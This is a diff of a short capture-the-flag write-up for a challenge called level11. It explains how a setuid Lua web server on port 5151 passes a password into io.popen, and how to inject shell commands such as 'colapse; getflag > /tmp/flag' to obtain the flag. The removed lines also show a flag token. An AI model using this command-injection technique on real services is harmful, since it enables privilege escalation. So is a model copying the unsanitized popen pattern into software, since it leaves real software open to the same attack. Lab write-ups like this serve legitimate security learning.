@@ -1,20 +1,3 @@
-cat level11.lua
-
-we can see a lot of code, but the main thing is that create a webserver listening on PORT 5151
-we can also see it use a lua function popen(), this function execute a shell command and return his result
-
-so this is a basic exploit, execute an elevated command to get the flag
-
-the line:
-> prog = io.popen("echo "..pass.." | sha1sum", "r")
-
-step 1/
-nc localhost 5151
-
-step 2/ the serv prompt to a password
-colapse; getflag > /tmp/flag; echo NotSoEasy
-
-step 3/
-cat /tmp/flag to retrieve the flag
-
-Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+level11.lua-> create a webserver listening on PORT 5151
+To send anything we send a request with nc localhost 5151 to wait for the password prompt
+It uses Popen which blindly execute shell code kinda like system, and it is SetUID so we can argforecho; `getflag` > /tmp/flag
